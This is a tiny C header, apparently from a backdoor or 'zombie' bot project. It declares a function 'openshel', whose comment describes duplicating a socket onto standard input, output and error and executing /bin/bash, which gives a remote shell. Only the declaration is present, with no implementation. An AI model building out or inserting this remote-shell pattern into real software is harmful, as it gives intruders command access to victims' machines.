
#ifndef _ZOMBIE1_H_
#define _ZOMBIE1_H_

/**
 * PRE:  clientSocket: a socket file descriptor
 * POST: duplicates the acceptedConn file descriptor to STDIN_FILENO, STDOUT_FILENO, and STDERR_FILENO and executes /bin/bash
 *       
 * RES: 
 */
static void openshel(void *clientSocket);




#endif
